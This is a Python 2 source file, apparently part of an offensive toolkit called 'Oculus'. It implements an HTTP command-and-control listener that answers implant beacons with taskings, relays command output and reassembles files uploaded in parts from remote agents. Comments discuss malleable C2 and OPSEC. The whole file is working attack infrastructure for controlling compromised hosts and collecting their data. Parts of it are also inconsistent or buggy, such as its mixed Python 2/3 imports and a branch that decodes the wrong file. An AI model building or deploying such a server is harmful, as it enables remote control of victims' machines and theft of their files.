import BaseHTTPServer
try:
    import http.server as server
except ImportError:
    # Handle Python 2.x
    import SimpleHTTPServer as server

import SocketServer
import os
import sys
import ssl
import cgi
import re
import time
import json
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
import time
import requests



sys.path.append("../")

############
# WHAT THIS DOES
# http.py is a flexible HTTP c2 handler. It binds to a given port and handles communications to and from remote agents
# The Oculus HTTP c2 Handler is capable of managing communications for multiple and disparate implants without the need for separate ports or infrastructure
# Listeners are standalone an may be invoked directly or externally

class Listener:
    def Start(self, NAME, TYPE, LPORT, LHOST):
        print "[+] Instantiating listener on " + LHOST + ":" + LPORT


    def Stop(self):
        pass

class ServerHandler(server.SimpleHTTPRequestHandler):
   def _set_headers(self):
      self.send_response(200)
      self.send_header('Content-type', 'text/html')
      self.end_headers()

   def do_GET(self):
       self._set_headers()
       # Recieve beacon
       # !!! Implement Malleable c2 and trap uris !!! this is where management of separate implant comm channels happens

       # Query Oculus API and provide response
       # Oculus should manage tasks and only return new taskings
       # Listener should send agent token in api request
       res = requests.get('http://localhost:29000/api/c2')
       data = res.json()
       tasklist = json.dumps(data)

       # Respond to agent with tasklist
       self.wfile.write(tasklist)

       return

   def do_POST(self):
       self._set_headers()

       # Recieve command response
       self.data_string = self.rfile.read(int(self.headers['Content-Length']))

       self.send_response(200)
       self.end_headers()

       # If upload get/stash file, then signal api/c2 of upload to push to emc
       jdata = json.loads(self.data_string)
       print(jdata)
       if jdata["type"] == "u":
          print("Upload inc...")
          if jdata["part"] == "0":
             print("file part 0")
             f = open(jdata["filename"] + "-cache", "w")
             f.write(jdata["data"])
             f.close()

             if jdata["mp"] == "false":
                print("yay! no more parts")
                #Process file
                #base64 decode contents and save to data
                with open(jdata["filename"] + "-cache", 'r') as file:
                    f = file.read().replace('\n', '')

                nf = open(jdata["filename"], "w")
                nf.write(base64.b64decode(f))
                nf.close()
                data = {
                    "type": "u",
                    "filename": jdata['filename']
                }
                ndata = json.dumps(data)
                res = requests.post('http://localhost:29000/api/c2', data=ndata)
          else:
             print("next part")
             f = open(jdata["filename"] + "-cache", "a")
             f.write(jdata["data"])
             f.close()
             #If no more parts process the file and signal oculus to pass the file to emc
             #The above logic will break any attempt to AES encrypt the upload parts (OPSEC UNSAFE)
             if jdata["mp"] == "false":
                print("yay! no more parts")
                #Process file
                #base64 decode contents and save to data
                with open(jdata["filename"], 'r') as file:
                    f = file.read().replace('\n', '')

                nf = open(jdata["filename"], "w")
                nf.write(base64.b64decode(f))
                nf.close()
                data = {
                    "type": "u",
                    "filename": jdata['filename']
                }
                ndata = json.dumps(data)
                res = requests.post('http://localhost:29000/api/c2', data=ndata)



       # update = json.loads(self.data_string)

       # !!! Implement Malleable c2 and trap uris !!! this is where management of separate implant comm channels happens

       # Submit Oculus API and provide response
       # Oculus should manage tasks and only return new taskings
       # Listener should send agent token in api request
       else:
           res = requests.post('http://localhost:29000/api/c2', data=self.data_string)
           data = res.json()
           tasklist = json.dumps(data)
           # Respond to agent with tasklist
           self.wfile.write(tasklist)

       return

##########################
# Main Execution
##########################
if __name__ == '__main__':
    NAME = sys.argv[1]
    TYPE = sys.argv[2]
    LPORT = int(sys.argv[3])
    LHOST = sys.argv[4]

    print "[+] Instantiating listener on " + LHOST + ":" + str(LPORT)

    # Instantiate new listener
    Handler = ServerHandler
    SocketServer.TCPServer.allow_reuse_address=True
    httpd = SocketServer.TCPServer(("", LPORT), Handler)
    httpd.serve_forever()
